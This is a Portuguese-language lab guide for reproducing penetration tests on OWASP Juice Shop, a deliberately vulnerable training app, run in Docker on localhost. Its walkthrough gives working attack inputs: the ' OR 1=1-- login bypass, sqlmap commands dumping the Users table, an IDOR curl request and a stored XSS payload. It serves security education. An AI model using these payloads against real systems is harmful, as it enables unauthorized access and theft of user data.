# Guia para Reproduzir os Testes de Penetração

Este documento descreve o passo a passo necessário para reproduzir todos os testes de penetração realizados no OWASP Juice Shop.

## Pré-requisitos

| Requisito | Versão Mínima | Download |
|:---|:---|:---|
| **Docker Desktop** | 20.10+ | https://www.docker.com/products/docker-desktop/ |
| **Navegador Web** | - | Chrome, Firefox ou Edge |
| **Kali Linux (opcional)** | 2024.1+ | https://www.kali.org/get-kali/ |

> **Nota:** Os comandos abaixo funcionam tanto no Windows (PowerShell/CMD) quanto no Linux.

---

## Passo 1: Instalação do Docker (Windows)

### 1.1 Baixar e Instalar o Docker Desktop

1. Acesse: https://www.docker.com/products/docker-desktop/
2. Baixe o instalador para Windows
3. Execute o instalador e siga as instruções
4. **Reinicie o computador** após a instalação
5. Abra o Docker Desktop e aguarde a inicialização

### 1.2 Verificar instalação

1. docker --version
Deve mostrar: Docker version 20.10.x ou superior

## Passo 2: Iniciar o OWASP Juice Shop

### 2.1 Baixar e executar o container

# Baixar a imagem do Juice Shop
docker pull bkimminich/juice-shop

# Executar o container
docker run -d -p 3000:3000 bkimminich/juice-shop

### 2.2 Verificar se está rodando

# Ver containers ativos
docker ps

# Testar acesso
curl http://localhost:3000

### 2.3 Acessar no navegador

Abra o navegador e acesse: http://localhost:3000

## Passo 3: Ferramentas Utilizadas

### 3.1 Instalação no Windows

# Ferramenta	              # Instalação
 cURL	            Já vem instalado no Windows 10/11
 Burp Suite	        Baixar em: https://portswigger.net/burp/communitydownload
 sqlmap	            Baixar em: https://sqlmap.org/ (requer Python)
 Gobuster	        Baixar em: https://github.com/OJ/gobuster/releases

### 3.2 Instalação do Python (para sqlmap)

# Verificar se Python está instalado
python --version

# Se não tiver, baixar em: https://www.python.org/downloads/

### 3.3 Instalação do sqlmap

# Clonar o repositório
git clone https://github.com/sqlmapproject/sqlmap.git

# Acessar a pasta
cd sqlmap

# Testar
python sqlmap.py --version

## Passo 4: Reproduzindo as Vulnerabilidades

### 4.1 SQL Injection - Bypass de Login

1. Acesse: http://localhost:3000/#/login
2. No campo Email, digite: ' OR 1=1--
3. No campo Password, digite qualquer valor
4. Clique em "Log in"
5. Você será logado como administrador!

### 4.2 SQL Injection - Extração de Dados com sqlmap

# Testar vulnerabilidade
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=1" --level=3 --dbms=sqlite --batch

# Extrair tabela de usuários
python sqlmap.py -u "http://localhost:3000/rest/products/search?q=1" --level=3 --dbms=sqlite --batch -T Users --dump

### 4.3 Broken Access Control - Painel Admin

1. Após fazer login com o bypass:
2. Acesse diretamente: http://localhost:3000/#/administration
3. Você verá o painel administrativo!

### 4.4 IDOR - Acessar Carrinho de Outro Usuário

# Primeiro, faça login e capture o token (no DevTools > Network)
# Depois, use o token para acessar outros carrinhos

curl -X GET http://localhost:3000/rest/basket/2 \
  -H "Authorization: Bearer SEU_TOKEN_AQUI"

### 4.5 XSS Persistente

1. Faça login
2. Acesse qualquer produto: http://localhost:3000/#/product/1
3. Role até "Write a review"
4. Cole o payload: <script>alert('XSS')</script>
5. Clique em "Submit"
6. O alerta aparecerá na tela!


### 4.6 Directory Listing
1. Acesse no navegador: http://localhost:3000/ftp/
2. Você verá a lista de arquivos expostos!

### 4.7 Metrics Exposure
1. Acesse no navegador: http://localhost:3000/metrics
2. Você verá métricas do sistema!

## Passo 5: Parar o Juice Shop

# Listar containers
docker ps

# Parar o container
docker stop NOME_DO_CONTAINER

# Remover o container (opcional)
docker rm NOME_DO_CONTAINER

### Avisos Importantes
 # Cuidado	                                  # Descrição
 Ambiente controlado	        Execute apenas em máquinas locais ou autorizadas
 Não exponha na internet	    O Juice Shop é deliberadamente vulnerável
 Uso educacional	            Destinado exclusivamente para aprendizado

### Referências
1. OWASP Juice Shop: https://owasp.org/www-project-juice-shop/
2. Docker Documentation: https://docs.docker.com/
3. sqlmap Documentation: https://sqlmap.org/
4. Burp Suite: https://portswigger.net/burp 

```bash